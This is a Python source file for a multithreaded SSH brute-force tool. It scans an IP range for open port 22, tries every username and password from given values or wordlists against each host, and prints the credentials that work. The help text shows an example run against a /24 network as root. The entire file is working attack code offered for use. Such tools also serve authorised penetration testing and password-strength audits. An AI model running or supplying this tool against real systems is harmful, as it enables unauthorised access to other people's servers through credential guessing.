from paramiko.client import SSHClient, AutoAddPolicy
import IPy
import sys
import os
from queue import Queue
import threading
from time import sleep
import socket

class brute():
	def __init__(self):
		self.hosts = []
		self.users = []
		self.passwd = []
		self.port = 22
		self.thread = 10
		self.wait_thread=0 
		self.lock = threading.Lock()
		self.queue = Queue()

	def __ssh_login(self,host,user,passwd):
		try:
			ssh_client = SSHClient()
			ssh_client.set_missing_host_key_policy(AutoAddPolicy())
			ssh_client.connect(hostname=str(host),port=self.port,username=user,password=passwd)
			print("check success:%s %s %s" % (host,user,passwd))
		except:
			pass
		self.lock.acquire()
		self.wait_thread = self.wait_thread - 1	
		self.lock.release()

	def __check_file(self,filename):
		return os.path.isfile(filename)

	def set_hosts(self,ips):
		self.hosts = list(IPy.IP(ips))
		
	def set_user(self,user):
		self.users =  [user]

	def set_passwd(self,passwd):
		self.passwd = [passwd]

	def set_user_from_file(self,filename):
		if self.__check_file(filename):
			self.users = self.__read_file(filename)
		else:
			exit("Not found file %s " % filename) 

	def set_passwd_from_file(self,filename):
		if self.__check_file(filename):
			self.passwd = self.__read_file(filename)
		else:
			exit("Not found file %s " % filename) 

	def __read_file(self,filename):
		return open(filename.strip(),'r').readlines()

	def __check_port(self,host,port):
		try:
			sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sk.settimeout(3)
			sk.connect((host,port))
			sk.close
			self.hosts.append(host)
		except:
			pass
		self.lock.acquire()
		self.wait_thread = self.wait_thread - 1	
		self.lock.release()

	def __host_port_access(self):
		hosts = self.hosts
		self.hosts = []
		self.wait_thread = len(hosts)
		for host in hosts:
			while threading.activeCount() > self.thread:
				sleep(0.1)
			threading.Thread(target=self.__check_port,args=(str(host),self.port)).start()
		while self.wait_thread != 0:
			sleep(0.1)
		print("port scan done")

	def ssh_check(self):
		self.__host_port_access()
		self.wait_thread=len(self.hosts)*len(self.users)*len(self.passwd)
		for host in self.hosts:
			for user in self.users:
				for p in self.passwd:
					while threading.activeCount() > self.thread:
						sleep(0.1)
					threading.Thread(target=self.__ssh_login,args=(host,user.strip(),p.strip())).start()
		while self.wait_thread != 0:
			sleep(0.1)
if __name__ == '__main__':
	method=""
	brute = brute()
	args=sys.argv
	if len(args) != 9:
		help="""
help:
	-m set brute method eg:ssh
	-h set host eg:127.0.0.1/24
	-u set one user
	-U set user file
	-p set one pass
	-P set pass file
%s -m ssh -h 10.10.1.0/24 -u root -p 123456
			""" % (args[0])
		exit(help)
	brute.set_hosts(args[args.index('-h')+1])
	if '-u' in args:
		brute.set_user(args[args.index('-u')+1])
	if '-U' in args and '-u' not in args:
		brute.set_user_from_file(args[args.index('-U')+1])
	if '-p' in args:
		brute.set_passwd(args[args.index('-p')+1])
	if '-P' in args and '-p' not in args:
		brute.set_passwd_from_file(args[args.index('-P')+1])
	method = args[args.index('-m')+1]
	if method=='ssh':
		brute.ssh_check()
